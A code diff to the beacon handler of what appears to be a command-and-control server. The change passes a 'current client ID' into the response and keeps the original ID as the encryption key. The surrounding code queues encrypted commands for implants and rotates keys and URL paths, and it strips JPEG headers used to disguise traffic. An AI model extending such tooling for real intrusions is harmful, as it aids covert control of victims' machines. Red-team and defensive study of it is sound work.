@@ -62,7 +62,7 @@ class BeaconHandler(BaseHandler):
                             self.log_message(f"Removed text JPEG header 'FFD8FF' from data")
                     except Exception as e:
                         self.log_message(f"Error processing potential JPEG headers: {str(e)}")
-                
+                    
                 # Log the received client ID to verify
                 self.log_message(f"Client ID from request body: {client_id}")
             except json.JSONDecodeError:
@@ -103,8 +103,13 @@ class BeaconHandler(BaseHandler):
                 args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
                 self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
             
+            # Get the current client ID for responding
+            current_client_id = self.client_manager.get_current_client_id(client_id)
+            if current_client_id != client_id:
+                self.log_message(f"Using current client ID {current_client_id} for response to {client_id}")
+            
             # Send response to client
-            self._send_beacon_response(client_id, commands, has_key_operation, first_contact, include_rotation_info)
+            self._send_beacon_response(client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info)
             
             # Clear key rotation commands after delivery
             if has_key_operation and not first_contact:
@@ -114,7 +119,7 @@ class BeaconHandler(BaseHandler):
             logger.error(f"Error handling beacon: {str(e)}")
             self.send_error_response(500, "Internal server error")
     
-    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
+    def _send_beacon_response(self, client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info):
         """Send the response to the client beacon"""
         # For first contact or key operations, we need to send more detailed information
         if first_contact or has_key_operation or include_rotation_info or commands:
@@ -132,7 +137,7 @@ class BeaconHandler(BaseHandler):
                 else:
                     response_data["key_rotation"] = True
             
-            # Add path rotation info if requested - NOW INCLUDED IN RESPONSE BODY
+            # Add path rotation info if requested
             if include_rotation_info:
                 rotation_info = self.path_router.get_rotation_info()
                 response_data["rotation_info"] = rotation_info
@@ -149,7 +154,7 @@ class BeaconHandler(BaseHandler):
                 # Convert commands to JSON string for encryption
                 commands_json = json.dumps(commands)
                 
-                # Encrypt the commands
+                # Encrypt the commands - use the original client ID for encryption key
                 encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
                 
                 # Replace commands with encrypted version
